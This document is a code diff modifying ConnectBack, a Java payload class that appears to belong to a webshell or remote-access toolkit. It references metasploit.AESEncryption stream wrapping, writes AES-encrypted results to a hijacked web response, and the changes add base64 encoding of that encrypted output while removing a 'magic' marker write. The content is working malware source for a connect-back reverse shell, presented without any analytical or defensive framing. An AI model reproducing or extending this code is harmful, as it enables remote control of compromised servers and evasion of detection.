@@ -87,7 +87,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
                   so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                   write = so.getClass().getMethod("write", byte[].class);
                   write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  write.invoke(so, this.getMagic());
                   so.getClass().getMethod("flush").invoke(so);
                   so.getClass().getMethod("close").invoke(so);
                } catch (Exception var14) {
@@ -100,7 +99,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
             so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
             write = so.getClass().getMethod("write", byte[].class);
             write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            write.invoke(so, this.getMagic());
             so.getClass().getMethod("flush").invoke(so);
             so.getClass().getMethod("close").invoke(so);
          } catch (Exception var15) {
@@ -113,7 +111,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
          so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
          write = so.getClass().getMethod("write", byte[].class);
          write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         write.invoke(so, this.getMagic());
          so.getClass().getMethod("flush").invoke(so);
          so.getClass().getMethod("close").invoke(so);
       } catch (Exception var16) {
@@ -290,7 +287,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
 
          String aesPassword = props.getProperty("AESPassword", (String)null);
          if (aesPassword != null) {
-            Object[] streams = (Object[])((Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object)null, in, out, aesPassword));
+            Object[] streams = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object)null, in, out, aesPassword);
             in = (InputStream)streams[0];
             out = (OutputStream)streams[1];
          }
@@ -492,7 +489,30 @@ public class ConnectBack extends ClassLoader implements Runnable {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      return this.base64encode(bos.toByteArray()).getBytes();
+   }
+
+   private String base64encode(byte[] data) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+
+      Class Base64;
+      try {
+         this.getClass();
+         Base64 = Class.forName("java.util.Base64");
+         Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
+      } catch (Throwable var7) {
+         this.getClass();
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Object Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
    }
 
    private void fillContext(Object obj) throws Exception {
